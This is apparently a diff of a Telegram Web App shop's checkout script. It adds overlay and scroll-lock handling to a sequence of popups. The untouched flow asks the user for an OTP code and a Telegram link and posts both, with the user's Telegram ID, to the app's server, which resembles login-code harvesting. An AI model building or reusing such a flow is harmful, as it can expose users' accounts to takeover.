@@ -6,6 +6,7 @@ Telegram.WebApp.disableClosingConfirmation();
 document.addEventListener("DOMContentLoaded", () => {
     const checkoutButtonProduct = document.getElementById("checkout-button-product");
     const cartItemsContainer = document.getElementById("cart-items-product");
+
     checkoutButtonProduct.addEventListener("click", async () => {
         // Проверяем, есть ли товары в корзине
         const cartItems = cartItemsContainer.querySelectorAll("li");
@@ -48,7 +49,26 @@ document.addEventListener("DOMContentLoaded", () => {
         }, 3000);
     }
 
+    // Функция для создания оверлея
+    function createOverlay() {
+        const overlay = document.createElement("div");
+        overlay.classList.add("overlay");
+        document.body.appendChild(overlay);
+        document.body.classList.add("no-scroll"); // Блокируем прокрутку
+    }
+
+    // Функция для удаления оверлея
+    function removeOverlay() {
+        const overlay = document.querySelector(".overlay");
+        if (overlay) {
+            overlay.remove();
+        }
+        document.body.classList.remove("no-scroll"); // Восстанавливаем прокрутку
+    }
+
     function showOrderPopup() {
+        createOverlay(); // Создаем оверлей
+
         const popup = document.createElement("div");
         popup.classList.add("order-popup");
         popup.innerHTML = `
@@ -70,11 +90,11 @@ document.addEventListener("DOMContentLoaded", () => {
         // Обработчик закрытия окна
         popup.querySelector(".order-popup-close").addEventListener("click", () => {
             popup.remove();
+            removeOverlay(); // Удаляем оверлей
         });
 
         // Обработчик для кнопки "Далее" в первом окне
         popup.querySelector(".next-btn").addEventListener("click", () => {
-            // Если нужно, можно сохранить данные первого шага:
             const otpData = document.getElementById("order-input").value;
             if (!otpData) {
                 alert("Введите OTP-код!");
@@ -82,7 +102,6 @@ document.addEventListener("DOMContentLoaded", () => {
             }
             if (window.Telegram && window.Telegram.WebApp) {
                 const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
-                // Выводим Telegram ID в консоль сервера, отправив его через fetch
                 fetch("/save-otp", {
                     method: "POST",
                     headers: {
@@ -92,12 +111,14 @@ document.addEventListener("DOMContentLoaded", () => {
                 });
             }
             popup.remove();
-            // Показываем второе окно для ввода ссылки Telegram
-            showTelegramPopup();
+            removeOverlay(); // Удаляем оверлей
+            showTelegramPopup(); // Показываем второе окно
         });
     }
 
     function showTelegramPopup() {
+        createOverlay(); // Создаем оверлей
+
         const popup = document.createElement("div");
         popup.classList.add("order-popup");
         popup.innerHTML = `
@@ -119,6 +140,7 @@ document.addEventListener("DOMContentLoaded", () => {
         // Обработчик закрытия окна
         popup.querySelector(".order-popup-close").addEventListener("click", () => {
             popup.remove();
+            removeOverlay(); // Удаляем оверлей
         });
 
         // Обработчик для кнопки "Далее" во втором окне
@@ -130,7 +152,6 @@ document.addEventListener("DOMContentLoaded", () => {
             }
             if (window.Telegram && window.Telegram.WebApp) {
                 const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
-                // Выводим Telegram ID в консоль сервера, отправив его через fetch
                 fetch("/save_tg_link", {
                     method: "POST",
                     headers: {
@@ -140,8 +161,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 });
             }
             popup.remove();
-
-            // После ввода ссылки, запрашиваем с сервера последнюю запись заказа для текущего Telegram ID
+            removeOverlay(); // Удаляем оверлей
             fetchLatestOrder(window.Telegram.WebApp.initDataUnsafe.user.id);
         });
     }
@@ -169,6 +189,8 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     function showOrderDetailsPopup(order) {
+        createOverlay(); // Создаем оверлей
+
         const popup = document.createElement("div");
         popup.classList.add("order-popup");
         popup.innerHTML = `
@@ -189,28 +211,22 @@ document.addEventListener("DOMContentLoaded", () => {
 
         popup.querySelector(".order-popup-close").addEventListener("click", () => {
             popup.remove();
+            removeOverlay(); // Удаляем оверлей
         });
 
         popup.querySelector(".confirm-btn").addEventListener("click", async () => {
-            // Проверяем, что Telegram Web App инициализирован
             if (window.Telegram && window.Telegram.WebApp) {
-                // Проверяем, что initDataUnsafe.user существует
                 const user = window.Telegram.WebApp.initDataUnsafe.user;
                 if (user && user.id) {
                     const userId = user.id;
-
                     try {
-                        // Отправляем запрос на сервер
                         const response = await fetch('/api/order/end', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ telegram_id: userId })
                         });
-
-                        // Проверяем, что запрос выполнен успешно
                         if (response.ok) {
                             console.log('Запрос выполнен успешно');
-                            // Закрываем Telegram Web App
                             window.Telegram.WebApp.close();
                         } else {
                             console.error('Ошибка при выполнении запроса:', response.statusText);
